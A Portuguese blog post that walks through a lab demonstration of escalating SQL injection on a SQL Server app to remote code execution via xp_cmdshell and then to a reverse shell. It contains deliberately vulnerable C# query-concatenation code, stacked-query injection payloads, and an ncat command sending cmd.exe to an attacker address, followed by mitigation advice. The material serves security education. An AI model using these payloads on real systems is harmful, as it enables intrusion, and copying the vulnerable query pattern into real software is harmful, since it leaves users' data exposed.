---
title: Comprometendo um servidor através de um simples SQL Injection
date: 2022-11-18 17:48:14
tags: ["hacking", "SQLi"]
---

## Sumário
- [Introdução](#Introducao)
- [Premissas](#Premissas)
- [Passo 1: Aplicação vulnerável à SQLi](#Passo-1-Aplicacao-vulneravel-a-SQLi)
- [Passo 2: Funcionalidade CmdShell do SQL Server](#Passo-2-Funcionalidade-CmdShell-do-SQL-Server)
- [Passo 3: Juntando SQLi com o CmdShell](#Passo-3-Juntando-SQLi-com-o-CmdShell)
- [Passo 4: Comprometendo o servidor com Reverse Shell](#Passo-4-Comprometendo-o-servidor-com-Reverse-Shell)
- [Conclusão](#Conclusao)

## Introdução

O objetivo é demonstrar que nas condições certas, é possível escalar o impacto de um simples [SQLi (SQL Injection)](https://owasp.org/www-community/attacks/SQL_Injection) para um [RCE (Remote Code Execution)](https://www.geeksforgeeks.org/what-is-remote-code-execution-rce/), que por sua vez evoluir para um [Reverse Shell](https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/), entregando acesso completo à rede interna de uma empresa a partir do servidor do banco de dados.

Os impactos conhecidos do **SQLi** já são suficientemente desastrosos, porém como nada é tão ruim que não possa piorar, também é possível comprometer o servidor associado à aplicação.

## Premissas

- Aplicação vulnerável a SQLi, qualquer linguagem ou tecnologia;
- Banco de dados SQL Server;
- Usuário da aplicação conectado ao banco de dados com privilégios de alteração de configurações ***ou*** com a opção **xp_cmdshell** pré-habilitada;

## Passo 1: Aplicação vulnerável à SQLi

Nesta demonstração iniciei uma aplicação web simples,  vulnerável à SQLi. A função é uma busca pelo nome de uma pessoa em uma tabela de usuários.

> ![Sistema base](/imgs/sqli_to_rce/sistema_base.png)

Código vulnerável:
```csharp
var command = new SqlCommand("Select Nome from Usuarios where Nome = '" + input + "'", conn);

var result = new StringBuilder();

using (var reader = command.ExecuteReader())
{
	while (reader.Read())
	{
		result.AppendLine(reader[0].ToString());
	}
}
```

Para testar o conceito, podemos utilizar o *payload* básico ```' OR 1=1;--``` para demonstrar a vulnerabilidade:

> Inserindo o payload  e resultado obtido
![Sistema base com sqli](/imgs/sqli_to_rce/sistema_base_com_sqli.png)

## Passo 2: Funcionalidade CmdShell do SQL Server

A funcionalidade **xp_cmdshell** é uma opção avançada, e extremamente poderosa (portanto perigosa), que o SQL Server possui. A opção executa um comando de Windows através de SQL, retornando o resultado através de linhas. [Clique aqui](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) para a documentação oficial.

Por exemplo, através da instância podemos executar comandos para listar os arquivos ```.exe``` do diretório:
```cmd
EXEC xp_cmdshell 'dir *.exe';
```
> ![exemplo cmdshell](/imgs/sqli_to_rce/shell_1.png)

Ou saber as informações da instância:
```
EXEC xp_cmdshell 'whoami';
```
> ![exemplo cmdshell](/imgs/sqli_to_rce/shell_2.png)

Estes mesmos comandos podem ser executados diretamente da aplicação que está conectada ao banco de dados.

Para que esta opção possa ser utilizada, é necessário ativar as configurações avançadas e também a opção *xp_cmdshell*, conforme abaixo:
```cmd
EXEC sp_configure 'show advanced options',1;RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE
```

Por padrão, estas opção estão com o valor ```0```, indicando a impossibilidade da execução direta. Porém, caso o usuário conectado ao banco de dados possua permissão para tal (o famoso **'sa'** *full access*), basta executar os comandos referenciados acima previamente, para ativação da funcionalidade.


## Passo 3: Juntando SQLi com o CmdShell

Agora que possuímos os elementos necessários, basta um pouco de criatividade e insistência para explorar os caminhos necessários para causar um grande impacto.

Partindo do princípio que o SQL Server não possui as opções avançadas ligadas, podemos então explorar o SQLi para habilitar as condições necessárias:

*Payload* executadas na aplicação:
```
> ';EXEC sp_configure 'show advanced options',1;RECONFIGURE--
> ';EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--
```

A partir desse momento, já é possível executar qualquer comando diretamente no servidor em que se encontra o banco de dados, caracterizando o **RCE**.

Tomamos como exemplo a manipulação de uma arquivo que está na pasta *temp*:
> ![comando move](/imgs/sqli_to_rce/move_1.png)

Então, executando um simples comando **'move'** para provar o conceito, com o *payload* pela aplicação *web*
```
';EXEC xp_cmdshell 'move c:\temp\teste.txt c:\temp\teste2.txt'--
```
> ![comando move](/imgs/sqli_to_rce/move_2.png)

Se parássemos aqui, já teríamos consequências suficientes para interrupção de toda uma operação, considerando possibilidades como:
* Exclusão de arquivos
* Manipulação de informações
* Causa de indisponibilidade
* Quebra de confidencialidade e integridade das informações
* ... e por aí vai

## Passo 4: Comprometendo o servidor com Reverse Shell

Agora com o **RCE** confirmado, é possível evoluir para o *Reverse Shell*, onde através do servidor impactado entregaremos o acesso direto e completo à máquina do atacante, dispensando a aplicação como meio.

Para demonstração desta parte, configurei um servidor virtual com *Kali Linux*, simulando a máquina do atacante. Nesta máquina, ativado um *listener* para a porta ```3000``` através do *netcat*

```cmd
nc -nlp 3000 -v
```
> ![netcat no kali](/imgs/sqli_to_rce/kali_1.png)

Voltando à exploração RCE, basta prepararmos um *payload* para que o servidor da vítima se comunique com o servidor do atacante, entregando através do IP e o servidor pré-determinado, o *command* do Windows (cmd.exe).

Comando a ser executado (```192.168.101.125``` é o endereço IP do servidor do atacante):
```cmd
ncat 192.168.101.125 3000 -e c:\windows\system32\cmd.exe
```

Como o comando será executado no contexto do usuário do banco de dados, é preciso passar o caminho completo do acionamento do netcat:
```cmd
where ncat
> "C:\Program Files (x86)\Nmap\ncat.exe"
```

Então, podemos preparar o *payload* para enviar através da aplicação;
```
';EXEC xp_cmdshell '"C:\Program Files (x86)\Nmap\ncat.exe" 192.168.101.125 3000 -e c:\windows\system32\cmd.exe'--
```
> ![payload do reverse shell](/imgs/sqli_to_rce/payload_shell_cmd.png)

Se voltarmos para a visão da máquina do atacante, é possível verificar que a conexão foi realizada. A partir deste momento, é como se o atacante estivesse fisicamente no servidor da vítima executando qualquer comando que desejasse pela linha de comando do Windows.
> ![reverse shell concluído](/imgs/sqli_to_rce/kali_acesso_concedido.png)
> ![reverse shell concluído](/imgs/sqli_to_rce/kali_dir_completo.png)

## Conclusão
Com o comprometimento completo do servidor, a vítima fica *à mercê* do atacante com o tipo de estrago ou extorsão a ser realizado. Caso este servidor não esteja uma rede [DMZ](https://www.fortinet.com/br/resources/cyberglossary/what-is-dmz), a escalação pode prosseguir com navegação lateral pelos servidores e estações de uma organização, causando ainda mais estragos.

Algumas sugestões de possíveis impactos:
- Exclusão total dos arquivos e dados do servidor ou banco de dados
- Instalação de Ransonware's
- Mineração criptomoeda
- Nó para atividades criminal
- Extração e vazamento de dados
- Monitoramento silencioso

Não basta atentarmos que as aplicações não estejam vulneráveis à SQLi, para uma melhor eficiência nas mitigações de segurança, é preciso trabalhar para que o *attack chain* seja quebrado, ou seja, impedir um possível ataque evolua em vários pontos.

Isto quer dizer que qualquer um desses casos abaixo iria mitigar a exploração e os impactos sofridos:

- Não utilização do usuário 'sa' ou com altos privilégios de alteração de configurações do banco de dados, como usuário que a aplicação se conecta.
- Isolamento do servidor do database do resto da estrutura - DMZ.
- Compartilhamento da instância do banco de dados com outras aplicações. O comprometimento pode se originar daquela antiga aplicação esquecida, que ninguém usa.

As recomendações não se limitam a esta pequena lista, mas servem para instigar que todos os processos e estruturas sejam pesadas para mitigar a evolução de uma vulnerabilidade encontrada na ponta.

O foco demonstrado aqui foi com o banco de dados *SQL Server*, porém podem existir funções equivalentes em outros *databases*, aqui não explorado.

